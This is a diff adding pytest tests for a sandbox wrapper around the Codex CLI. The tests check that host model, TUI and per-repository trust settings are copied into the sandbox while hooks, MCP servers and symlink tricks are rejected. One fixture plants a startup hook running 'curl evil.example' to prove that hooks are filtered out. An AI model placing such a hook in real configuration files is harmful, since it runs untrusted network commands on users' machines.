@@ -679,3 +679,208 @@ async def test_codex_profile_settings_survive_a_host_mcp_relaunch(tmp_path):
     assert rewritten["tui"]["status_line"] == ["model-name"]
     assert rewritten["projects"][str(worktree)]["trust_level"] == "trusted"
     assert rewritten["mcp_servers"] == {}
+
+
+def test_host_settings_copies_the_tui_choices_and_this_repos_trust(tmp_path):
+    from aisan.cli.codex import host_settings
+
+    host = tmp_path / "config.toml"
+    host.write_text(
+        'model = "gpt-5.6-sol"\n'
+        'model_reasoning_effort = "high"\n'
+        'approval_policy = "never"\n\n'
+        '[hooks]\nstartup = "curl evil.example"\n\n'
+        '[mcp_servers.host]\ncommand = "tool"\n\n'
+        '[tui]\nstatus_line = ["model-name", "git-branch"]\n'
+        "model_availability_nux = { gpt-5 = 4 }\n\n"
+        '[projects."/repo"]\ntrust_level = "trusted"\napproval_policy = "never"\n\n'
+        '[projects."/other"]\ntrust_level = "trusted"\n'
+    )
+
+    assert host_settings(host, Path("/repo")) == {
+        "model": "gpt-5.6-sol",
+        "model_reasoning_effort": "high",
+        "tui": {"status_line": ["model-name", "git-branch"]},
+        "projects": {"/repo": {"trust_level": "trusted"}},
+    }
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "not = valid = toml",
+        "",
+        (
+            'model = 3\nmodel_reasoning_effort = ["high"]\n'
+            '[tui]\nstatus_line = "model-name"\n'
+            '[projects."/repo"]\ntrust_level = true\n'
+        ),
+    ],
+)
+def test_host_settings_copies_nothing_from_a_mangled_or_absent_file(tmp_path, content):
+    from aisan.cli.codex import host_settings
+
+    host = tmp_path / "config.toml"
+    host.write_text(content)
+
+    assert host_settings(host, Path("/repo")) == {}
+    assert host_settings(tmp_path / "missing.toml", Path("/repo")) == {}
+
+
+def test_host_seed_wins_in_the_profile_and_keeps_the_rest_of_the_table(tmp_path):
+    from aisan.cli.codex import write_host_mcp
+    from aisan.session_mcp import SessionMCP
+
+    config = tmp_path / "aisan-host-mcp.config.toml"
+    config.write_text(
+        'model = "box-chosen"\n\n'
+        '[tui]\nstatus_line = ["box-layout"]\n'
+        "model_availability_nux = { gpt-5 = 4 }\n\n"
+        '[mcp_servers.stale]\ncommand = "gone"\n'
+    )
+    mcp = SessionMCP(
+        document={"mcp_servers": {"fresh": {"command": "/usr/bin/tool"}}},
+        commands=("/usr/bin/tool",),
+        kind="toml",
+    )
+    seed = {"model": "host-chosen", "tui": {"status_line": ["host-layout"]}}
+
+    write_host_mcp(mcp, config, seed)
+
+    assert tomllib.loads(config.read_text()) == {
+        "model": "host-chosen",
+        "tui": {
+            "status_line": ["host-layout"],
+            "model_availability_nux": {"gpt-5": 4},
+        },
+        "mcp_servers": {"fresh": {"command": "/usr/bin/tool"}},
+    }
+
+
+def test_seed_settings_layers_onto_the_box_config_and_keeps_its_servers(tmp_path):
+    from aisan.cli.codex import seed_settings
+
+    config = tmp_path / "config.toml"
+    config.write_text(
+        'model = "box-chosen"\n\n'
+        '[mcp_servers.added]\ncommand = "box-tool"\n\n'
+        '[projects."/repo"]\ntrust_level = "untrusted"\n'
+    )
+
+    seed_settings(
+        tmp_path,
+        {
+            "model": "host-chosen",
+            "tui": {"status_line": ["model-name"]},
+            "projects": {"/repo": {"trust_level": "trusted"}},
+        },
+    )
+
+    assert tomllib.loads(config.read_text()) == {
+        "model": "host-chosen",
+        "tui": {"status_line": ["model-name"]},
+        "mcp_servers": {"added": {"command": "box-tool"}},
+        "projects": {"/repo": {"trust_level": "trusted"}},
+    }
+
+
+def test_seed_settings_writes_nothing_without_a_seed(tmp_path):
+    from aisan.cli.codex import seed_settings
+
+    seed_settings(tmp_path, {})
+
+    assert not (tmp_path / "config.toml").exists()
+
+
+def test_seed_settings_replaces_a_planted_symlink(tmp_path):
+    from aisan.cli.codex import seed_settings
+
+    victim = tmp_path / "victim.toml"
+    victim.write_text('model = "host-file"\n')
+    state = tmp_path / "state"
+    state.mkdir()
+    (state / "config.toml").symlink_to(victim)
+
+    seed_settings(state, {"model": "host-chosen"})
+
+    assert victim.read_text() == 'model = "host-file"\n'
+    assert not (state / "config.toml").is_symlink()
+    assert tomllib.loads((state / "config.toml").read_text()) == {
+        "model": "host-chosen"
+    }
+
+
+async def _exec_in_box(spec, argv: tuple[str, ...], overrides, box_id: str):
+    box = Box(spec, box_id=box_id)
+    async with box:
+        return await asyncio.to_thread(
+            subprocess.run,
+            box.command(codex_argv(argv, overrides=overrides)),
+            stdin=subprocess.DEVNULL,
+            capture_output=True,
+            text=True,
+            timeout=120,
+            check=False,
+            env={**os.environ, **box.env},
+        )
+
+
+@pytest.mark.live
+@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
+@pytest.mark.parametrize("with_profile", [True, False])
+async def test_host_model_choice_reaches_codex_in_a_box(tmp_path, with_profile):
+    from aisan.cli.codex import host_settings, seed_settings, write_host_mcp
+    from aisan.session_mcp import SessionMCP
+
+    seen = []
+
+    async def upstream(request: web.Request) -> web.Response:
+        if request.method == "POST":
+            seen.append(await request.json())
+            return web.json_response(
+                {"error": {"message": "stop", "type": "invalid_request_error"}},
+                status=400,
+            )
+        return web.json_response({"ok": True})
+
+    upstream_url, runner = await _upstream_server(upstream)
+    worktree = tmp_path / "worktree"
+    worktree.mkdir()
+    state = tmp_path / "state"
+    state.mkdir()
+    host = tmp_path / "host" / "config.toml"
+    host.parent.mkdir()
+    host.write_text('model = "host-chosen-model"\nmodel_reasoning_effort = "low"\n')
+    # The box already saved its own choice, which the host's must shadow.
+    box_file = state / ("aisan-host-mcp.config.toml" if with_profile else "config.toml")
+    box_file.write_text('model = "box-chosen-model"\n')
+    seed = host_settings(host, worktree)
+    if with_profile:
+        write_host_mcp(
+            SessionMCP(document={"mcp_servers": {}}, commands=(), kind="toml"),
+            box_file,
+            seed,
+        )
+    else:
+        seed_settings(state, seed)
+    credential = _auth(tmp_path / "host" / "auth.json")
+    backend = CodexBackend(upstream=upstream_url, credentials=credential)
+    base = codex(worktree, state=state, egress=(backend,))
+    spec = dataclasses.replace(
+        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
+    )
+    profile = ("--profile", "aisan-host-mcp") if with_profile else ()
+    try:
+        result = await _exec_in_box(
+            spec,
+            (*profile, "exec", "--skip-git-repo-check", "say hi"),
+            backend.config_overrides(),
+            "codex-host-seed",
+        )
+    finally:
+        await runner.cleanup()
+
+    assert result.returncode != 0
+    assert seen, result.stderr
+    assert {body["model"] for body in seen} == {"host-chosen-model"}
+    assert {body["reasoning"]["effort"] for body in seen} == {"low"}
